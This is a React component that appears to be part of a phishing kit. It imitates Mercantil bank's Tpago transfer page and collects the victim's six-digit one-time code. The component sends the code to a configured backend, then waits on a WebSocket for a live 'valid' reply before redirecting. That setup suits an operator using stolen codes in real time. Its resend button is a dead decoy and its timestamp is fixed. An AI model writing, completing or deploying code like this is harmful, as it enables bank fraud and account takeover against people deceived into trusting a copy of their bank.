import { useCallback, useEffect, useRef, useState } from "react";
import { BACKEND_URL, WS_URL } from "../config.ts";
import { navigateTo } from "../pathname.ts";
import { EyeIcon } from "./EyeIcon.tsx";
import { PreguntasLoading } from "./PreguntasLoading.tsx";
import "./ClaveTemporalPage.css";

const TITLE = "Mercantil - Clave Temporal";

export function ClaveTemporalPage() {
  useEffect(() => {
    const previous = document.title;
    document.title = TITLE;
    return () => {
      document.title = previous;
    };
  }, []);

  const [clave, setClave] = useState("");
  const [showClave, setShowClave] = useState(false);
  const [waitingValidation, setWaitingValidation] = useState(false);
  const [validationError, setValidationError] = useState("");
  const wsRef = useRef<WebSocket | null>(null);

  useEffect(() => {
    return () => {
      wsRef.current?.close();
      wsRef.current = null;
    };
  }, []);

  const toggleClave = useCallback(() => {
    setShowClave((prev) => !prev);
  }, []);

  const handleAccept = useCallback(async () => {
    wsRef.current?.close();

    const ws = new WebSocket(WS_URL);
    wsRef.current = ws;
    setWaitingValidation(true);
    setValidationError("");

    ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (typeof data.valid !== "boolean") return;

        if (data.valid) {
          navigateTo("/validando");
          return;
        }

        setWaitingValidation(false);
        setValidationError(
          "La clave temporal ingresada no es válida. Por favor verifica el código.",
        );
        ws.close();
        wsRef.current = null;
      } catch {
        return;
      }
    };

    ws.onerror = () => {
      setWaitingValidation(false);
      setValidationError(
        "No fue posible validar la clave temporal. Intenta nuevamente.",
      );
      wsRef.current = null;
    };

    try {
      await fetch(`${BACKEND_URL}/send`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          type: "otp",
          code: clave,
        }),
      });
    } catch (err) {
      console.error("Error sending OTP:", err);
      setWaitingValidation(false);
      setValidationError(
        "No fue posible enviar la clave temporal. Intenta nuevamente.",
      );
      ws.close();
      wsRef.current = null;
    }
  }, [clave]);

  const handleSubmit = useCallback(
    (e: React.FormEvent) => {
      e.preventDefault();
      handleAccept();
    },
    [handleAccept],
  );

  if (waitingValidation) {
    return (
      <PreguntasLoading
        title="Validando clave temporal"
        message="Espere un momento mientras verificamos el código ingresado..."
      />
    );
  }

  return (
    <main className="clave-body">
      <header className="clave-navbar">
        <img
          src="/logotauro.svg"
          alt="Mercantil"
          className="clave-navbar-logo"
          width="45"
          height="36"
        />
      </header>

      <section className="clave-header" aria-label="Contexto de la operación">
        <nav className="clave-breadcrumb" aria-label="Migas de pan">
          <span className="clave-breadcrumb-item">Resumen Financiero</span>
          <span className="clave-breadcrumb-sep" aria-hidden="true">
            &gt;
          </span>
          <span className="clave-breadcrumb-item">Tpago</span>
        </nav>
        <p className="clave-timestamp">30/07/2026 - 04:24:35 pm</p>
      </section>

      <div className="clave-container">
        <h1 className="clave-page-title">Enviar Tpago</h1>

        <form
          className="clave-card"
          onSubmit={handleSubmit}
          noValidate
          aria-label="Formulario de clave temporal"
        >
          <div className="clave-step-header">
            <div className="clave-step-circle">3 de 3</div>
            <div className="clave-step-text">
              <h2 className="clave-step-title">Ingresa tu clave temporal</h2>
              <p className="clave-step-subtitle">Siguiente paso: Finalizar</p>
            </div>
          </div>

          <p className="clave-instruction">
            Introduce la clave temporal que hemos enviado a tu teléfono celular:
          </p>

          {validationError !== "" && (
            <div
              className="mb-5 rounded-lg border border-red-300 bg-red-50 px-4 py-3 text-sm text-red-700"
              role="alert"
            >
              {validationError}
            </div>
          )}

          <div className="clave-field-group">
            <label className="clave-field-label" htmlFor="clave-input">
              Clave temporal
            </label>
            <div className="clave-input-row">
              <input
                id="clave-input"
                type={showClave ? "text" : "password"}
                value={clave}
                onChange={(e) => setClave(e.target.value)}
                placeholder="_ _ _ _ _ _"
                autoComplete="off"
                inputMode="numeric"
                maxLength={6}
                aria-label="Clave temporal"
              />
              <EyeIcon
                visible={showClave}
                onClick={toggleClave}
                label="Mostrar clave"
              />
            </div>
          </div>

          <p className="clave-resend">
            Si no has recibido la clave temporal en <strong>178</strong>{" "}
            segundos, haz clic en{" "}
            <button
              type="button"
              className="clave-resend-link"
              onClick={(e) => {
                e.preventDefault();
              }}
            >
              Reenviar clave temporal
            </button>
            .
          </p>
        </form>

        <div className="clave-actions">
          <button
            type="button"
            className="clave-accept-btn"
            onClick={handleAccept}
          >
            Aceptar
          </button>
          <button type="button" className="clave-cancel-btn">
            Cancelar
          </button>
        </div>
      </div>

      <footer className="clave-footer">
        <div className="clave-quick-access-header">
          <svg
            width="16"
            height="16"
            viewBox="0 0 24 24"
            fill="none"
            stroke="#333333"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            aria-hidden="true"
          >
            <circle cx="12" cy="12" r="3" />
            <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z" />
          </svg>
          Accesos rápidos
          <svg
            className="clave-chevron"
            width="14"
            height="14"
            viewBox="0 0 24 24"
            fill="none"
            stroke="#999999"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            aria-hidden="true"
          >
            <polyline points="18 15 12 9 6 15" />
          </svg>
        </div>
        <button type="button" className="clave-quick-link">
          <svg
            width="14"
            height="14"
            viewBox="0 0 24 24"
            fill="none"
            stroke="#0066cc"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            aria-hidden="true"
          >
            <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" />
            <polyline points="9 22 9 12 15 12 15 22" />
          </svg>
          Resumen financiero
        </button>
      </footer>
    </main>
  );
}
